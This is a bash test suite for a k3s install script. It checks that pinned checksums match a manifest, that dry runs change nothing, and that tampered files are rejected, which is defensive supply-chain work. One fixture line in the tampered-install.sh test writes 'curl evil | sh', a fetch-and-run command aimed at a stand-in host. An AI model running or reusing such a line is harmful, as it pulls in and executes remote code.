#!/usr/bin/env bash
#
# Offline test for k8s/bootstrap/install-k3s.sh (Slice 5).
# Requires no network, no root, no Nix. Runs on Linux, WSL and Git Bash.
#
# Asserts:
#   1. The script's default pins equal manifest/appliance-manifest.json
#      (kubernetes.version: tag, binary sha256, install.sh sha256, download
#      base) and its server flags start with the upstream INSTALL_K3S_EXEC.
#   2. K3S_OFFLINE_DIR + matching pins + K3S_DRY_RUN=1: verifies both files,
#      prints the exact install command (SKIP_DOWNLOAD, upstream flags,
#      --tls-san), exits 0 and writes nothing to K3S_BIN_DIR.
#   3. A tampered k3s binary is rejected: exit 3, expected/actual printed.
#   4. A tampered install.sh is rejected the same way.
#   5. A missing offline file is rejected (exit 2) before any verification.
#   6. --print-pins reflects environment overrides; unknown args exit 1.
#   7. shellcheck passes on both scripts (skipped when not installed).

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SCRIPT="${REPO_ROOT}/k8s/bootstrap/install-k3s.sh"
MANIFEST="${REPO_ROOT}/manifest/appliance-manifest.json"

pass=0
fail=0
ok() { printf '  \033[32mPASS\033[0m %s\n' "$1"; pass=$((pass + 1)); }
bad() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; fail=$((fail + 1)); }
dump() { printf '%s\n' "$1" | sed 's/^/      | /'; }

echo "test-k3s-install: starting"
[[ -f "${SCRIPT}" ]] || { echo "script not found: ${SCRIPT}"; exit 2; }
[[ -f "${MANIFEST}" ]] || { echo "manifest not found: ${MANIFEST}"; exit 2; }

tmp="$(mktemp -d "${TMPDIR:-/tmp}/dawo-k3s-test.XXXXXX")"
trap 'rm -rf "${tmp}"' EXIT

# Run the script with every K3S_* variable cleared, then apply the given ones.
# (`env -u` avoids inheriting overrides from the caller's shell.)
run_clean() {
  env -u K3S_VERSION -u K3S_BINARY_SHA256 -u K3S_INSTALL_SH_SHA256 \
    -u K3S_DOWNLOAD_BASE -u K3S_INSTALL_SH_URL -u K3S_TLS_SAN -u K3S_EXTRA_EXEC \
    -u K3S_BIN_DIR -u K3S_OFFLINE_DIR -u K3S_NODE_READY_TIMEOUT -u K3S_DRY_RUN \
    "$@"
}

sha() { sha256sum "$1" | awk '{print $1}'; }

# --- 1. default pins equal the manifest ------------------------------------
# Read the manifest through stdin so Windows python3 never sees a POSIX path.
manifest_values() {
  if command -v jq >/dev/null 2>&1; then
    jq -r '.kubernetes.version | .tag, .binary.sha256, .install_script.sha256, .download_base, .install_script.env.INSTALL_K3S_EXEC' <"${MANIFEST}"
  elif command -v python3 >/dev/null 2>&1; then
    python3 -c '
import json, sys
v = json.load(sys.stdin)["kubernetes"]["version"]
print(v["tag"]); print(v["binary"]["sha256"]); print(v["install_script"]["sha256"])
print(v["download_base"]); print(v["install_script"]["env"]["INSTALL_K3S_EXEC"])
' <"${MANIFEST}"
  else
    return 1
  fi
}

# Windows python3 prints CRLF; strip it so the values compare cleanly.
if vals="$(manifest_values | tr -d '\r')"; then
  mapfile -t mv <<<"${vals}"
  m_tag="${mv[0]}"; m_bin="${mv[1]}"; m_sh="${mv[2]}"; m_base="${mv[3]}"; m_exec="${mv[4]}"
  pins="$(run_clean bash "${SCRIPT}" --print-pins)"
  get() { printf '%s\n' "${pins}" | sed -n "s/^$1=//p"; }
  s_tag="$(get K3S_VERSION)"; s_bin="$(get K3S_BINARY_SHA256)"
  s_sh="$(get K3S_INSTALL_SH_SHA256)"; s_base="$(get K3S_DOWNLOAD_BASE)"; s_exec="$(get K3S_EXEC)"
  if [[ "${s_tag}" == "${m_tag}" && "${s_bin}" == "${m_bin}" && "${s_sh}" == "${m_sh}" && "${s_base}" == "${m_base}" ]]; then
    ok "default pins equal the manifest (${m_tag}, k3s ${m_bin:0:12}…, install.sh ${m_sh:0:12}…)"
  else
    bad "default pins differ from the manifest"
    dump "script:   ${s_tag} ${s_bin} ${s_sh} ${s_base}"
    dump "manifest: ${m_tag} ${m_bin} ${m_sh} ${m_base}"
  fi
  if [[ "${s_exec}" == "${m_exec} --tls-san "* ]]; then
    ok "server flags keep upstream '${m_exec}' and add --tls-san (Traefik not disabled)"
  else
    bad "server flags do not start with the manifest INSTALL_K3S_EXEC: '${s_exec}'"
  fi
  # The raw install.sh URL must encode '+' as %2B for the pinned tag.
  s_url="$(get K3S_INSTALL_SH_URL)"
  if [[ "${s_url}" == "https://raw.githubusercontent.com/k3s-io/k3s/${m_tag//+/%2B}/install.sh" ]]; then
    ok "install.sh URL derived from the pinned tag (${s_url##*/k3s/})"
  else
    bad "unexpected install.sh URL: ${s_url}"
  fi
else
  echo "  SKIP pin comparison (neither jq nor python3 available)"
fi

# --- fixtures: dummy release files with known checksums --------------------
offline="${tmp}/offline"
mkdir -p "${offline}"
printf 'dummy k3s binary for tests\n' >"${offline}/k3s"
printf '#!/bin/sh\necho dummy install.sh\n' >"${offline}/install.sh"
good_bin="$(sha "${offline}/k3s")"
good_sh="$(sha "${offline}/install.sh")"
bindir="${tmp}/bin"
mkdir -p "${bindir}"

# --- 2. offline + matching pins + dry run --------------------------------------
out=""
if out="$(run_clean env K3S_OFFLINE_DIR="${offline}" K3S_BINARY_SHA256="${good_bin}" \
  K3S_INSTALL_SH_SHA256="${good_sh}" K3S_DRY_RUN=1 K3S_BIN_DIR="${bindir}" \
  bash "${SCRIPT}" 2>&1)"; then
  if grep -q "verified k3s binary" <<<"${out}" \
    && grep -q "verified install.sh" <<<"${out}" \
    && grep -q "DRY RUN: would run: env" <<<"${out}" \
    && grep -q "INSTALL_K3S_SKIP_DOWNLOAD=true" <<<"${out}" \
    && grep -q -- "--write-kubeconfig-mode 644 --tls-san mb.dawo.internal" <<<"${out}" \
    && ! grep -q -- "--disable traefik" <<<"${out}" \
    && grep -q "no changes made" <<<"${out}"; then
    ok "dry run verifies both files and prints the pinned install command"
  else
    bad "dry run output missing expected markers"
    dump "${out}"
  fi
  if [[ -z "$(ls -A "${bindir}")" ]]; then
    ok "dry run writes nothing to K3S_BIN_DIR"
  else
    bad "dry run wrote into K3S_BIN_DIR: $(ls -A "${bindir}")"
  fi
  if grep -q "^\[install-k3s\] " <<<"${out}" && ! grep -qv "^\[install-k3s\] " <<<"${out}"; then
    ok "every output line carries the [install-k3s] prefix"
  else
    bad "output lines without the [install-k3s] prefix"
    dump "$(grep -v '^\[install-k3s\] ' <<<"${out}")"
  fi
else
  bad "dry run exited non-zero against matching pins"
  dump "${out}"
fi

# --- 2b. K3S_EXTRA_EXEC and K3S_TLS_SAN are honoured ---------------------------
out="$(run_clean env K3S_OFFLINE_DIR="${offline}" K3S_BINARY_SHA256="${good_bin}" \
  K3S_INSTALL_SH_SHA256="${good_sh}" K3S_DRY_RUN=1 K3S_BIN_DIR="${bindir}" \
  K3S_TLS_SAN=k3s.example.test K3S_EXTRA_EXEC="--node-name mb" bash "${SCRIPT}" 2>&1 || true)"
if grep -q -- "--write-kubeconfig-mode 644 --tls-san k3s.example.test --node-name mb" <<<"${out}"; then
  ok "K3S_TLS_SAN and K3S_EXTRA_EXEC are appended to the server flags"
else
  bad "K3S_TLS_SAN / K3S_EXTRA_EXEC not reflected in the install command"
  dump "${out}"
fi

# --- 3. tampered binary rejected ---------------------------------------------
tampered="${tmp}/tampered-bin"
mkdir -p "${tampered}"
cp "${offline}/install.sh" "${tampered}/install.sh"
printf 'dummy k3s binary for tests\nEVIL\n' >"${tampered}/k3s"
set +e
out="$(run_clean env K3S_OFFLINE_DIR="${tampered}" K3S_BINARY_SHA256="${good_bin}" \
  K3S_INSTALL_SH_SHA256="${good_sh}" K3S_DRY_RUN=1 K3S_BIN_DIR="${bindir}" bash "${SCRIPT}" 2>&1)"
rc=$?
set -e
if [[ "${rc}" -eq 3 ]] \
  && grep -q "SHA-256 mismatch for k3s binary" <<<"${out}" \
  && grep -q "expected: ${good_bin}" <<<"${out}" \
  && grep -q "actual:   $(sha "${tampered}/k3s")" <<<"${out}" \
  && ! grep -q "would run" <<<"${out}" \
  && [[ -z "$(ls -A "${bindir}")" ]]; then
  ok "tampered k3s binary rejected (exit 3, expected/actual printed, nothing installed)"
else
  bad "tampered k3s binary not rejected as expected (rc=${rc})"
  dump "${out}"
fi

# --- 4. tampered install.sh rejected -------------------------------------------
tampered_sh="${tmp}/tampered-sh"
mkdir -p "${tampered_sh}"
cp "${offline}/k3s" "${tampered_sh}/k3s"
printf '#!/bin/sh\ncurl evil | sh\n' >"${tampered_sh}/install.sh"
set +e
out="$(run_clean env K3S_OFFLINE_DIR="${tampered_sh}" K3S_BINARY_SHA256="${good_bin}" \
  K3S_INSTALL_SH_SHA256="${good_sh}" K3S_DRY_RUN=1 K3S_BIN_DIR="${bindir}" bash "${SCRIPT}" 2>&1)"
rc=$?
set -e
if [[ "${rc}" -eq 3 ]] && grep -q "SHA-256 mismatch for install.sh" <<<"${out}" \
  && ! grep -q "would run" <<<"${out}"; then
  ok "tampered install.sh rejected (exit 3)"
else
  bad "tampered install.sh not rejected as expected (rc=${rc})"
  dump "${out}"
fi

# --- 4b. real pins against dummy files must also fail (no accidental match) ---
set +e
out="$(run_clean env K3S_OFFLINE_DIR="${offline}" K3S_DRY_RUN=1 K3S_BIN_DIR="${bindir}" bash "${SCRIPT}" 2>&1)"
rc=$?
set -e
if [[ "${rc}" -eq 3 ]] && grep -q "expected: ${m_bin:-835873f3}" <<<"${out}"; then
  ok "manifest pins reject files that are not the pinned release"
else
  bad "dummy files passed against the manifest pins (rc=${rc})"
  dump "${out}"
fi

# --- 5. missing offline file rejected before verification -------------------
empty="${tmp}/empty"
mkdir -p "${empty}"
set +e
out="$(run_clean env K3S_OFFLINE_DIR="${empty}" K3S_DRY_RUN=1 K3S_BIN_DIR="${bindir}" bash "${SCRIPT}" 2>&1)"
rc=$?
set -e
if [[ "${rc}" -eq 2 ]] && grep -q "is missing" <<<"${out}" && ! grep -q "verified" <<<"${out}"; then
  ok "missing offline file rejected (exit 2), no network attempted"
else
  bad "missing offline file not handled as expected (rc=${rc})"
  dump "${out}"
fi

# --- 6. --print-pins honours overrides; unknown args refused -----------------
out="$(run_clean env K3S_VERSION=v9.9.9+k3s1 bash "${SCRIPT}" --print-pins)"
if grep -qx "K3S_VERSION=v9.9.9+k3s1" <<<"${out}" \
  && grep -qx "K3S_INSTALL_SH_URL=https://raw.githubusercontent.com/k3s-io/k3s/v9.9.9%2Bk3s1/install.sh" <<<"${out}"; then
  ok "--print-pins reflects K3S_VERSION override and re-derives the install.sh URL"
else
  bad "--print-pins does not reflect overrides"
  dump "${out}"
fi
if run_clean bash "${SCRIPT}" --bogus >/dev/null 2>&1; then
  bad "unknown argument accepted"
else
  ok "unknown argument refused"
fi

# --- 7. shellcheck ----------------------------------------------------------
if command -v shellcheck >/dev/null 2>&1; then
  if shellcheck "${SCRIPT}" "${BASH_SOURCE[0]}"; then
    ok "shellcheck clean (install-k3s.sh, this test)"
  else
    bad "shellcheck reported findings"
  fi
else
  echo "  SKIP shellcheck (not installed here; run via nix shell nixpkgs#shellcheck)"
fi

echo "test-k3s-install: ${pass} passed, ${fail} failed"
[[ "${fail}" -eq 0 ]]
